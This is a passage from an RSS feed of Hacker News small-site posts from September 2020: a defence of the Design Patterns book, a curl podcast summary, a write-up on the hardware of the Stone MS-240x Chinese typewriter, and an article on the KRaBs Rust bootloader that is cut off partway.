<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood">https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood</a></em></p>]]>
            </description>
            <link>https://psyche.co/guides/how-to-make-new-friends-when-youre-busy-with-adulthood</link>
            <guid isPermaLink="false">hacker-news-small-sites-24515221</guid>
            <pubDate>Fri, 18 Sep 2020 10:59:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't hate the book because you don't use it]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514953">thread link</a>) | @aseure
<br/>
September 18, 2020 | https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/ | <a href="https://web.archive.org/web/*/https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<h3>
  18 September 2020
</h3>


  <p>In a few months, I’ll celebrate my fifth year as a professional - understand paid - software engineer. I find this role to be a right balance of technical skills, human relationships and it fulfils my curiosity. As time goes by, I’m also starting to be disappointed by some of its negative aspects. While it doesn’t prevent me from sleeping, I think an effort could be made to challenge some lousy and short-sighted comments we see daily on social platforms.</p>
<p>Today, I’d like to talk about <a href="https://www.amazon.com/Design-Patterns-Object-Oriented-Addison-Wesley-Professional-ebook/dp/B000SEIBB8">Design Patterns: Elements of Reusable Object-Oriented Software</a>, a book written by Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides, famously known as the <em>Gang of Four</em>. If you never read it: this is a fundamental programming book describing programming abstractions published in 1994. The date is essential here, but we’ll come to that later.</p>
<p>This book has recently been discussed by many, due to <a href="https://twitter.com/unclebobmartin/status/1306581616983183361">a recent tweet from Robert. C. Martin aka Uncle Bob</a>. Long story short, telling a massive audience that book X is great, and treating people who consider it outdated as “foolish” does not end well.</p>
<p>While I disagree with the tone here, I’d like to focus on the negative comments which followed, including but not limited to:</p>
<ul>
<li>the book is outdated</li>
<li>its concepts are outdated</li>
<li>its authors said it’s outdated</li>
<li>the book is only focused on mid-90s C++ developers</li>
<li>no one ever used the “flyweight” design pattern</li>
<li>the book is not even readable</li>
<li>its abstractions make code unreadable</li>
</ul>
<p>First of all, let’s get back to 1994. I was two at the time. All Internet websites could probably fit on a floppy disk, Jeff Bezos founded Amazon, Rasmus Lerdorf was only starting to work on its <em>Personal Home Page/Forms Interpreter</em> CGI C program, and Larry Page and Sergey Brin would only start their research project for a web search engine two years later. The biggest technology companies were IBM, Hewlett-Packard, Motorola and Xerox, which mostly sat behind the oil, car, and food industries. Programming existed, but it wasn’t the same field as we know it today. Tech companies were a few, and I assume a lot of programmers were working in other industries. Being a professional in this sector was arguably more difficult then, and knowledge was not as easily accessible as it is today. This book was published in a world where programming started to spread in many industries. It surely was a very good resource, to try to apply its concepts, and see what works and what doesn’t. The authors were literally inventing the field at the time: Erich Gamma, for instance, teamed up with Kent Beck to create the Java JUnit test framework just a few years later, which hugely helped to popularise testing.</p>
<p>My point is: let’s remind ourselves we stand on the shoulders of many people who tried and experimented a lot at the time. We too often take for granted the knowledge and productivity we have today. On top of that, let’s not be disrespectful towards the previous generation. My father and my grandfather both work(ed) as electricians: never did my father complain about his father’s tools or habits before him. He learned them and perfected them with modern knowledge.</p>
<p>Now about the book in itself. While I agree with people saying that some design patterns are too abstract, I strongly disagree with the ones saying the whole book is outdated. Should you develop in a OO language today, such as Java, C++, Python or Ruby, or even more notably, develop a framework or a tool <em>for</em> developers, I think this book is still highly relevant today.</p>
<p>Here are my top picks from the book and why I chose them.</p>
<p><strong>Builder:</strong> because in OOP, objects often hold too much data in them, you need to control how to instantiate them properly. Even with overloaded constructors, data validation at instantiation can become messy. Do you like your testing framework using a <em>fluent interface</em> with method chaining (<code>assert(...).not().equalTo(...)</code>)? Guess what, it’s directly inspired by the builder design pattern.</p>
<p><strong>Prototype:</strong> I often hear people complaining about how complicated JavaScript is. While I don’t think this language makes it easy for the developer to write non error-prone code, I better understood the language via the lens of its prototype-based nature, precisely described by the prototype design pattern.</p>
<p><strong>Most of the structural patterns:</strong> While everyone is focused on the bad parts of OOP, namely inheritance, all those design patterns are focused on composability. If you want to be cool nowadays, you could say you prefer “composition over inheritance”. Well, if you think composition is only about embedding objects in each other, you should read the part of structural design patterns. For instance, you probably know decorators from Python or annotations in Java/C#, they derive from the decorator design pattern.</p>
<p><strong>Chain of Responsibility:</strong> I think we can all agree on how great it is to use and implement a middleware in our modern web framework. Just use or write functions which take a <em>next</em> handler, a request object. Pass it to your web framework instance via a <code>.use(...)</code> method and you’re done. This is what the Chain of Responsibility pattern is all about. All Rails, Django, and Laravel developers knew that was NIH.</p>
<p><strong>Iterator:</strong> This one seems obvious now, perhaps not so much at a time where iterating on arrays with pointer arithmetic was common. Today, iterators are even buried behind standard libraries to implement even higher abstract functionalities, but they are still there. I don’t see a more universal way to implement, with the same public API, a traversal of an array, a tree, or a graph (they are better ways of iterating those last data structures though).</p>
<p><strong>Observer:</strong> For this last one, here is the verbatim definition from the book: “Define a one-to-many dependency between objects so that when one object changes state, all its dependents are notified and updated automatically”. Now, if we take a look at some modern technologies, doesn’t this resonate with PubSub models or React hooks for instance?</p>
<p>To conclude, I’m not saying the book is not old, quite the opposite: you can feel it when it takes as examples from 90s user interfaces. I’m merely advocating that our industry and its workers have changed a lot in the last 30 years, dare I say even more than in any other industry. But this should not be an excuse to sweep away years of meticulous R&amp;D and documentation, on which our modern tools still rely on nowadays, and the people behind it.</p>
<p>Because a lot of people complained that they were never able to finish the book, here is an extract from the end, section “What to Expect from Design Patterns”, page 351:</p>
<blockquote>
<p>It’s possible to argue that this book hasn’t accomplished much. After all, it doesn’t present any algorithms or programming techniques that haven’t been used before. […] it just documents existing designs. You could conclude that it makes a reasonable tutorial, perhaps, but it certainly can’t offer much to an experienced object-oriented designer.</p>
<p>We hope you think differently. Cataloging design patterns is important. It gives us standard names and definitions for the techniques we use. If we don’t study design patterns in software, we won’t be able to improve them, and it’ll be harder to come up with new ones.</p>
<p>This book is only a start.</p>
</blockquote>

</div></div>]]>
            </description>
            <link>https://aseure.fr/articles/2020-09-18-dont-hate-the-book-because-you-dont-use-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514953</guid>
            <pubDate>Fri, 18 Sep 2020 10:14:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Security Headlines: cURL special with Daniel Stenberg [audio]]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24514932">thread link</a>) | @devrustr
<br/>
September 18, 2020 | https://blog.firosolutions.com/2020/09/security-headlines-curl-special/ | <a href="https://web.archive.org/web/*/https://blog.firosolutions.com/2020/09/security-headlines-curl-special/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  





<p><img alt="curl security headlines podcast" src="https://blog.firosolutions.com/shcurl.png"></p><h3 id="summary">Summary:</h3>

<p>In this episode of Security Headlines, we jump into curl with<br>
its founder and maintainer Daniel Stenberg.<br>
We talk security, CI systems, creation of curl, Fuzzing, IRC bots<br>
and a lot more!</p>

<p>Relax, Tune in and enjoy this episode of Security Headlines:</p>







<p><a href="https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g">https://anchor.fm/firo-solutions/episodes/Curl-special-with-Daniel-Stenberg-ejqn0g</a></p>

<p>Few software developers never even get near to having one<br>
of their projects being picked up by a larger community.</p>

<p>A project that started as a currency plugin to an IRC bot.<br>
Spun off and ended up becoming bigger and bigger resulting in being
adopted by over 10 billion devices.  Well, this project is called<br>
curl!  Curl is known to be the stable swizz army knife that can<br>
be used for making various types of transfer requests.</p>

<p>Need to download a file? Curl is here for you<br>
Need to test a socks5 proxy? Curl is here for you<br>
Need to download an ezine over Gopher? Curl is here for you<br>
Need to test a unix socket? Curl is here for you</p>

<p>In this episode of Security Headlines, we are joined by Daniel<br>
Stenberg who is the founder and maintainer of Curl.<br>
He has even been awarded a gold medal by the Swedish king for<br>
his work with Curl.</p>



<p><img alt="curl Daniel stenberg King medal" src="https://blog.firosolutions.com/daniel-king.jpg"></p><p>The curl codebase is around 100 000 lines of C code, filled with<br>
hidden gems such as a libcurl code generator that creates a template<br>
based on the command line arguments you give it.</p>

<p>One of curl’s many features is the –libcurl option which<br>
takes the commmand you give curl and generate a C program that use<br>
libcurl with the same functionally, you can even port it to other<br>
programming languages with a similar syntax and use it with libcurl’s<br>
bindings.</p>

<pre><code>$ curl https://blog.firosolutions.com --libcurl example.c   
$ head example.c 
/********* Sample code generated by the curl command line tool **********
 * All curl_easy_setopt() options are documented at:
 * https://curl.haxx.se/libcurl/c/curl_easy_setopt.html
 ************************************************************************/
#include &lt;curl/curl.h&gt;

int main(int argc, char *argv[])
{
  CURLcode ret;
  CURL *hnd;

</code></pre>

<p>Even Google love Curl, having curl in over 100 devices.<br>
This leads us to Google’s fuzzing project, where they have<br>
an army of computers that feed automated generated data in order<br>
to find bugs.<br>
This has resulted in curl being more stable, secure, and mature.</p>

<p>The world is always moving and so is the technology evolution.<br>
Getting a bit dystopian here, but maybe we will move to a future<br>
where we are running everything in a browser.<br>
A world where everything runs ipv6 and http3.</p>

<p>In that world, I know one tool we can count on.</p>

<h3 id="external-links">External links:</h3>

<p><a href="https://curl.haxx.se/">https://curl.haxx.se/</a><br>
<a href="https://curl.haxx.se/docs/security.html">https://curl.haxx.se/docs/security.html</a><br>
<a href="https://en.wikipedia.org/wiki/CURL">https://en.wikipedia.org/wiki/CURL</a><br>
<a href="https://twitter.com/bagder">https://twitter.com/bagder</a><br>
<a href="https://www.wolfssl.com/">https://www.wolfssl.com/</a><br>
<a href="https://daniel.haxx.se/">https://daniel.haxx.se/</a><br>
<a href="https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;can=1&amp;q=proj:curl">https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;can=1&amp;q=proj:curl</a><br>
<a href="https://en.wikipedia.org/wiki/Gopher_%28protocol%29">https://en.wikipedia.org/wiki/Gopher_%28protocol%29</a><br>
<a href="https://curl.haxx.se/mail/">https://curl.haxx.se/mail/</a></p>

</div></div>]]>
            </description>
            <link>https://blog.firosolutions.com/2020/09/security-headlines-curl-special/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514932</guid>
            <pubDate>Fri, 18 Sep 2020 10:10:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hardware Design of a 8088 based Chinese Typewriter made in the 1980s]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24514269">thread link</a>) | @tifan
<br/>
September 18, 2020 | https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/ | <a href="https://web.archive.org/web/*/https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <header id="banner">
      
    </header><!-- /#banner -->
    <!-- /#menu -->
<section id="content">
  <header>
    <h2>
      Stone MS-240x Typewriter (2): Hardware Design
    </h2> 
    
  </header>
  <!-- /.post-info -->
  <div>
    <p>In case you misseed it -- I talked about the backgrounds of the MS-240x typewriter in the <a href="https://tifan.net/blog/2020/09/09/revealing-a-forgotten-chinese-compute-history-stone-ms240x-chinese-typewritter-1-background/">previous article</a>. In this article, I'm going to discuss the hardware design of the legendary Stone MS-240x Chinese Typewriter (四通 MS-240x 中英文打字机) designed and sold in the mid-1980s.</p>
<p>Both the hardware and the BIOS was designed by ALPS Electric Co. ALPS provided a BIOS reference manual before the development began so that the developers in China could just write an emulator on the PC emulating the ALPS BIOS, and just focus on the development of the word processor.</p>
<div id="the-hardware">
<h2>The Hardware</h2>
<p><img alt="Stone MS-2401H 四通 MS-2401H 打字机" src="https://tifan.net/images/20200917-ms-2401h.jpg"></p><p>(<a href="https://www.lty.me/stone-ms-2401h/">Picture taken by @lty1993</a>)</p>
<p>As I mentioned in the previous article, the hardware is just a 8088 machine in its core. In the 80s, the Japanese engineer reverse engineered and implemented Japanese counterparts of almost all popular chips in the west. The ALPS motherboard is not an exception to that.</p>
<p>I bought the machine on Xianyu (Chinese eBay equivalent) and shipped it to @lty1993 in China for examination, disassembly, and ROM dumps. The machine is quite heavy -- shipping it to the west coast would probably cost 200 USD. Guess there won't be any Stone Chinese Typewriters in the US for a while!</p>
</div>
<div id="processor-nec-v20">
<h2>Processor: NEC V20</h2>
<p>Instead of using the actual 8088 processor, MS-240x series used the NEC V20 running at different clock frequencies. The original MS-2400 clocks at 4.9125 MHz, the upgraded MS-2401 runs at 8 MHz, and the later MS-2401H model runs at 10 MHz.</p>
<p>The V20 is 30% faster than the original 8088 running at the same clock speed, providing additional power for the heavy lifting work a Chinese Typewriters needs to do.</p>
</div>
<div id="memory-hard-wired-memory-map-with-page-control">
<h2>Memory: Hard-wired Memory Map with Page Control</h2>
<p>The RAM itself is not interesting at all. It's just a bunch of Japanese made SRAM connected to the address bus of the processor.</p>
<p>The BIOS is mapped at <cite>0xF8000</cite> to <cite>0xFFFF</cite>, and CPU will execute the instruction at <cite>0xFFFF0</cite> -- that's the convention for 8088. So naturally, the BIOS was hard wired at that address.</p>
<p>Remember we talked about the Chinese fonts? It's a mask ROM, and it is quite large -- larger than the address space of 8088 processor if we include high precision Chinese fonts at 24x24 dot (which is still pretty awful in today's standard). To solve this problem, all external ROMs were divided into 32KB pages. To access any page in the ROM, you would send a command to the ASIC to select the page first (bank switching) before reading memory from the hard wired memory location. Sounds like a MMU? Well, this <em>is</em> a poor man's MMU.</p>
<p>One thing worth noting is that all models have built in battery backup units. Newer models (such as MS-2401) can even operate with battery with up to 3 hours battery life -- it almost makes the typewritter a laptop with a built-in printer.</p>
<p>Here's the memory map for various models of the Chinese typewriter.</p>
<p><img alt="Memory Map for MS-2400" src="https://tifan.net/images/20200917-ms-2400-memory-map.png"></p><p>MS-2400 have the Chinese font mapped at <cite>0xA0000</cite> with 16 pages in total. It can support up to 3 Chinese IMEs (input methods, such as Pinyin, Wubi or Cangjie) -- a standard IME comes with the machine, up to 2 additional IMEs can be purchased as a EPROM chip inserted in the expansion ROM socket. As there's only 1 IME socket, regardless of how many IMEs would you purchase, you'll always get just one 64KB EPROM. The keyboards are mapped at <cite>0x90000</cite> and have up to 3 pages in total.</p>
<p>When the machine was designed, there's also an expansion socket at <cite>0xE8000</cite>. However, the expansion socket was never used.</p>
<p>As the only display device is a 240x64 LCD, the VRAM is just 2KB in size mapped at <cite>0x80000</cite>.</p>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-memory-map.png"></p><p>MS-2401 is significantly more capable with a bigger LCD display, larger RAM, and larger Chinese font ROM. To conserve mask ROM space, all font data in the mask ROM was compressed.</p>
<p><img alt="Memory Map for MS-2401H" src="https://tifan.net/images/20200917-ms-2401h-memory-map.png"></p><p>You might wonder what does "V-RAM (CRT 用)" in MS-2401H/01C mean. MS-2401H/01C is the top of the line model in MS-2401 series featuring ability to attach an external monitor. The graphics chip is <cite>MGP TM6066A</cite>, a Hercules clone, with MDA output.</p>
</div>
<div id="system-devices">
<h2>System Devices</h2>
<p>We all know the 8088 is not a very capable machine. ALPS custom made a few ASICs to connect system devices such as printers, keyboards and LCD monitors to the system. That's also what makes it extremely hard to write an emulator -- without knowing exactly how the ASIC works, it's close to impossible to emulate all devices and peripherals. Even with the original designer's help, we still can't be quite sure what is the exact IO address for each device, let alone determining what each command would do.</p>
<p>But anyway, we do have an rough idea of what the system is doing.</p>
<div id="external-storage-device">
<h3>External Storage Device</h3>
<p>The first model, MS-2400, have an audio cassette connector running at 1200bps. Each cassette can hold around 500KB of data, or 250k Chinese characters.</p>
<p>In 1986, when 3 1/2 inch disk just came out, Mr Jizhi Wang chose to use the very new technology in MS-2401. This is a killer function at that time, because digital documents could be finally archived relatively cheaply. Of course you could always use a computer, but that's a big upfront investment.</p>
</div>
<div id="keyboard">
<h3>Keyboard</h3>
<p><img alt="Memory Map for MS-2401" src="https://tifan.net/images/20200917-ms-2401-keyboard.jpg"></p><p>It's not a ANSI keyboard. The design seems to be inspired by JIS keyboard, and was fully translated into Chinese -- you can't even find "Ctrl" on the keyboard, instead, you'll see "控制" (lit. control). This flattens learning curve for the typewriter, as it doesn't feel foreign to the users. Just like we say "it's all Chinese to me" -- the Chinese users would say "it's all English to me" -- because it really is!</p>
<p>One interesting fact to point out is instead of commonly seem Esc, Tab, Caps Lock, Shift, Ctrl arrangement on the left, the keyboard is actually 半/全 (half width / full width), Tab, Ctrl, Shift, 常用字 (frequently used characters). Of course, it's a Chinese typewriter, Caps Lock isn't that important after all.</p>
</div>
<div id="printer">
<h3>Printer</h3>
<p>It sees that the printer only accepts low level commands -- or shall we say, the printer itself does not have a controller. According to the reference manual, the printer head and motor are directly controlled by the ASIC. It also needs a few dedicated timers.</p>
</div>
<div id="asic-and-fdd-controller">
<h3>ASIC and FDD Controller</h3>
<p>In MS-2401H, there are 2 ASICs, each of them contains around 8000 gates. the model is uPD91260GD-5BD and uPD91261GD-5BB.</p>
<p>The floppy controller for MS-2401 MS-2401H is UPD72067GC.</p>
</div>
</div>
<div id="conclusion">
<h2>Conclusion</h2>
<p>The MS series machines are classical examples of pushing the hardware to its limits. Most people would simply say it's impossible to use a 8088-equivalent to drive a Chinese typewriter, but the engineers did it. By abusing the system and designing chips around the 8088, they were even able to map memory larger than the actual address space of the machine! Hats off to the hardworking engineers both in Stone Company and ALPS Electric.</p>
<p>Another thing to point out is Stone Company wrote fabulous documentations. It's really pleasing to read, contains a lot of technical details, and in some occasions, it teaches you electrical engineering! It even contained the layout of the diagnostics program so that you can just disassemble them and add new functionalities should you need them.</p>
<p><img alt="manga illustration in technical document" src="https://tifan.net/images/20200917-stone-documentation-manga.png"></p><p>Plus, the manga illustration is pretty cute. Haven't seen them for a long long time.</p>
</div>


  </div><!-- /.entry-content -->
  

</section>
    <!-- /#contentinfo -->
    
    
  </div></div>]]>
            </description>
            <link>https://tifan.net/blog/2020/09/17/ms240x-chinese-typewriter-2-ms-2401h-hardware-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514269</guid>
            <pubDate>Fri, 18 Sep 2020 08:21:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing an x86 bootloader in Rust that can launch vmlinux]]>
            </title>
            <description>
<![CDATA[
Score 144 | Comments 46 (<a href="https://news.ycombinator.com/item?id=24514100">thread link</a>) | @lukastyrychtr
<br/>
September 18, 2020 | https://vmm.dev/en/rust/krabs.md | <a href="https://web.archive.org/web/*/https://vmm.dev/en/rust/krabs.md">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
<article id="contents">
<section>

<p>I've been developping an x86 bootloader in Rust that can use Linux boot protocol. In this article, I'd like to write about my motivation, features of this project, and issues. </p>
 
</section>
<section>
<h2>KRaBs - Kernel Reader and Booters</h2>
<p>KRaBs is a 4-stage chain loader for x86/x86_64 written in Rust.
<br>
 It can boot an ELF-formatted kernel placed on a FAT32 filesystem in the EFI System Partition. The ELF-formatted kernel is read from the filesystem and relocated, and then the kernel is booted. 
<br>
 It is all implemented in Rust. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/">GitHub - o8vm/krabs: An x86 bootloader written in Rust.</a> </p>
<p>It has the following features: </p>
<ol> <li> Currently, only legacy BIOS is supported.</li> <li> Both 64 bit and 32 bit system are supported.</li> <li> Both 64 bit long mode and 32 bit protected mode kernel are supported.</li> <li> GPT format partition table is supported.</li> <li> FAT32 file system support.</li> <li> The boot-time behavior can be controlled by CONFIG.TXT, which is placed on the FAT32 filesystem.</li> <li> Minimal x86/x86_64 Linux boot protocol is supported.</li> <li> kernel command line setting in CONFIG.TXT is supported.</li> <li> Some modules such as initramsfs/initrd are supported.</li> 10. The multi-boot specification is not supported. </ol> 
<p>An example of starting 64bit vmlinux with kernel command line and initrd is described in <a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/docs/linux-image-setup-64.md">this article</a>. </p>
<p>Just git clone the project and run a <code>cargo run</code> to experience after some preparation: </p>
<pre><code>
cargo run -- -we disk.img
</code></pre>
<p><a target="_blank" rel="noopener noreferrer" href="https://vmm.dev/en/rust/gogWCnI37-demo3.gif"><img src="https://vmm.dev/en/rust/gogWCnI37-demo3.gif" alt="demo3.gif"></a></p>
</section>
<section>
<h2>What motivated me to develop KRaBs?</h2>
<p>I thought that lower level programming below the OS stack could be also made more modern by using Rust. I wanted to extract the minimum essentials from the process of booting the Linux kernel and finally make up original bootloader where there is no black box for me.
<br>
 </p>
<p>In addition: </p>
<ul> <li>It's not easy for me to read the source code of an existing chain loader.</li> <li>Reading large amounts of assembly and C source code is tough for a beginner. It takes a lot of time and effort to read it. </li> <li>It is said that Rust binaries tend to be too big and not suitable for writing bootloaders, but I wondered if it is true.</li> </ul> 
<p>Based on the above, I've decided to write down the bootloader in Rust from scratch. </p>
</section>
<section>
<h2>How KRaBs Works</h2>
</section>
<section>
<h3>Linux kernel bootstrapping mechanism</h3>
<p>While it may be difficult to unravel the Linux kernel bootstrapping mechanism from the bzImage and GRUB bootloader sources, The mechanism itself is surprisingly simple.
<br>
 There are four basic things: Loading the ELF-formatted image from the file system, Relocating it according to the program headers, and initializing system and setting parameters according to The Linux/x86 Boot Protocol. That's all there is to it. </p>
<p>Specifically, the following four types of initialization are performed: </p>
<p><strong>Hardware initialization:</strong> </p><ul> <li>Setting the keyboard repeat rate.</li> <li>Disable interrupts and mask all interrupt levels.</li> <li>Setting Interrupt descriptor (IDT) and segment descriptor (GDT). As a result,</li> all selectors (CS, DS, ES, FS, GS) refer to the 4 Gbyte flat linear address space. <li>Change the address bus to 32 bits (Enable A20 line).</li> <li>Transition to protected mode.</li> <li>If the target is ELF64, set the 4G boot pagetable and transition to long mode.</li> </ul> 
<p><strong>Software initialization:</strong> </p><ul> <li>Get system memory by BIOS call.</li> </ul> 
<p><strong>Information transmission to the kernel:</strong> </p><ul> <li>KRaBs mount the FAT32 EFI System Partition and Reading the CONFIG.TXT.</li> <li>Setting <a target="_blank" rel="noopener noreferrer" href="https://www.kernel.org/doc/html/latest/x86/zero-page.html">Zero Page</a> of kernel parameters and transmit it to the OS.</li> </ul> 
<p><strong>Load items and Relocate the kernel:</strong> </p><ul> <li>Load kernel, initrd and command line according to CONFIG.TXT.</li> <li>The target is an ELF file, KRaBs do the ELF relocation.</li> </ul> 
<p>The format of CONFIG.TXT is a simple matrix-oriented text file that looks like this: </p>
<pre><code>
main.kernel sample-kernel
main.initrd sample-initrd
main.cmdlin sample command line clocksource=tsc net.ifnames=0
</code></pre>
<p>To perform the above process, KRaBs uses a program that is divided into four stages. </p>
</section>
<section>
<h3>Stages Overview</h3>
<ol> <li> stage1  </li> A 446 byte program written to the boot sector. The segment registers(CS, DS, ES, SS) are set to <code>0x07C0</code>, and the stack pointer (ESP) is initialized to <code>0xFFF0</code>. After that, stage2 is loaded to address <code>0x07C0:0x0200</code>, and jumps to address <code>0x07C0:0x0206</code>. In the latter half of stage1, there is an area for storing the sector position and length (in units of 512 bytes) of the stage2 program. <li> stage2  </li> Load stage3 and stage4, then jump to stage3. The stage3 program is loaded at address <code>0x07C0:0x6000</code>, the stage4 is loaded at address <code>0x0003_0000</code> in the extended memory area. The file is read from the disk using a 2K byte track buffer from address <code>0x07C0:0xEE00</code>, and further transferred to an appropriate address using <code>INT 15h</code> BIOS Function <code>0x87h</code>. A mechanism similar to this function is used in stage 4. When the loading of stage3 and stage4 is completed, jump to address <code>0x07C0:0x6000</code>.  <li> stage3  </li> Do hardware and software initialization which need BIOS calls. After a series of initialization, empty_zero_page information is prepared in <code>0x07C0:0x0000</code> to <code>0x07C0:0x0FFF</code>. Enable the A20 line, change the address bus to 32 bits, and shift to the protect mode. Then, jump to the Stage4. <li> stage4  </li> Mount the FAT32 EFI System Partition. Then, read and parse the CONFIG.TXT on that partition. Load ELF kernel image, initrd, and kernel command line according to CONFIG.TXT. Drop to real mode when executing I/O. Set Command line and image informations in empty_zero_page. ELF kernel image is stored to the extended memory address <code>0x100000</code> or later, and then the ELF32/ELF64 file is parsed and loaded. If the target is ELF64, set the 4G boot pagetable and transition to long mode. Finally, jump to the entry point to launch the kernel. At this time, put the physical address (<code>0x00007C00</code>) of the empty_zero_page information prepared in the low-order memory into the <code>ESI</code> or <code>RSI</code> register. <li> plankton🦠  </li> library common to stage1 ~ stage4. </ol> 
</section>
<section>
<h3>How build KRaBs</h3>
<p>The directory structure of the KRaBs project is as follows: </p>
<pre><code>
$ cd /path/to
$ tree . -L 3
.
├── build.rs
├── Cargo.toml
├── rust-toolchain
├── src
│   ├── bios
│   │   ├── plankton
│   │   ├── stage_1st
│   │   ├── stage_2nd
│   │   ├── stage_3rd
│   │   └── stage_4th
│   ├── main.rs
│   └── uefi
...
</code></pre>
<p>All four stages that make up the bootloader for the legacy BIOS and a library called plankton are stored as a sub crate under a directory named <code>src/bios</code>.
<br>
 Under the <code>src/uefi</code> directory, we plan to store UEFI-compatible bootloader crates.
<br>
 All these sub-crates will be built by <code>build.rs</code> at <code>cargo build</code> time.
<br>
 </p>
<p><code>src/main.rs</code> is not the main body of the bootloader, <code>src/main.rs</code> is the CLI program that places KRaBs on the disk. This <code>main.rs</code> will write each stage of the KRaBs to the appropriate location on the disk. The <code>-w</code> option is used to write the stages to disk. </p>
<p>With this directory structure, just run <code>cargo buil</code> to build the CLI and the boot loader, and <code>cargo run -- -w disk.img</code> to burn the boot loader to disk. You can also test it with qemu by running <code>cargo run -- -e disk</code>. </p>
</section>
<section>
<h3>DISK Structure</h3>
<p>KRaBs supports disks that are partitioned in GPT format.
<br>
 The BIOS Boot Partition and the EFI System Partition are required. Place stage1 in the boot sector and stage2 ~ stage4 boot code for legacy BIOS in the BIOS Boot Partition. Place the CONFIG.TXT, Linux kernel, initrd on the FAT32 file system of the EFI System Partition. </p>
<p>Example: </p>
<pre><code>
$ gdisk -l disk.img 
...
Found valid GPT with protective MBR; using GPT.
Disk disk2.img: 204800 sectors, 100.0 MiB
Sector size (logical): 512 bytes
Disk identifier (GUID): 2A1F86BB-74EA-47C5-923A-7A3BAF83B5DF
Partition table holds up to 128 entries
Main partition table begins at sector 2 and ends at sector 33
First usable sector is 34, last usable sector is 204766
Partitions will be aligned on 2048-sector boundaries
Total free space is 2014 sectors (1007.0 KiB)

Number  Start (sector)    End (sector)  Size       Code  Name
   1            2048            4095   1024.0 KiB  EF02  BIOS boot partition
   2            4096          106495   50.0 MiB    EF00  EFI system partition
   3          106496          204766   48.0 MiB    8300  Linux filesystem
</code></pre>
</section>
<section>
<h3>Why use EFI System Partition?</h3>
<p>The reason for this is to make this project compatible with the UEFI environment in the future.
<br>
 I didn't support UEFI from the start because: </p>
<ul> <li>This bootloader was originally intended to be used on older PCs, such as the ThinkPad 600X.</li> <li>Currently, Legacy BIOS support works in a wider range system than UEFI.</li> <li>It is mainly intended to be used in the cloud environment except my PC. Legacy BIOS is the mainstream in x86 cloud environment, and there seems to be no merit to replace it with UEFI.</li> </ul> 
</section>
<section>
<h2>Is Rust good for writing a bootloader?</h2>
<p>I know there are pros and cons, but for me, Rust has been so much easier and better than writing C and assemblies. Personally, I think Rust is also pretty good for low-level programming, like bootloaders. </p>
<ol> <li> It's a great relief when the compilation is completed without problems   </li> When something goes wrong, most of the time I only need to suspect the unsafe part. This has made debugging a lot easier. I'm an amateur programmer, but thanks in part to this, I was able to complete my first prototype in a week. <li> Rust's build system is the best  </li> In Rust, you don't have to wonder which object file to link with which, like in C. <li> I can use my C experience</li> Since the chain loader is a rocket structure, we always have to code the unsafe parts in order to move to the next stage, and I thought it would be nice to be able to use the same techniques I often use in C for the unsafe parts.  <li> I think even the low-level code in no_std can be written in a modern way.</li> </ol> 
</section>
<section>
<h2>Issues</h2>
</section>
<section>
<h3>(RESOLVED) Setting Page Tables</h3>
<p>I tried to set up the page table with an alignment with a linker script or a struct attribute <a target="_blank" rel="noopener noreferrer" href="https://doc.rust-lang.org/reference/type-layout.html#representations">align</a>, but none of these things worked. It looked like the alignment settings were breaking other data structures. It's possible that I wasn't doing it right, but I didn't understand why and gave up debugging. In the end, I dealt with it by manually allocating the page table to the area where I wanted to set up. </p>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/o8vm/krabs/blob/master/src/bios/stage_4th/src/svm/lm.rs#L44-L69">This code:</a> </p>
<pre><code>
fn setup_page_tables() {
    use plankton::layout::PGTABLE_START;
    use plankton::mem::MemoryRegion;
    let mut pg_table = …</code></pre></section></article></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://vmm.dev/en/rust/krabs.md">https://vmm.dev/en/rust/krabs.md</a></em></p>]]>
            </description>
            <link>https://vmm.dev/en/rust/krabs.md</link>
            <guid isPermaLink="false">hacker-news-small-sites-24514100</guid>
            <pubDate>Fri, 18 Sep 2020 07:54:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Alacritty – Fastest OS X Terminal Emulator – Terminal like tmux/alacritty config]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24513821">thread link</a>) | @bebrws
<br/>
September 18, 2020 | https://bradbarrows.com/post/alacritty | <a href="https://web.archive.org/web/*/https://bradbarrows.com/post/alacritty">archive.org</a>
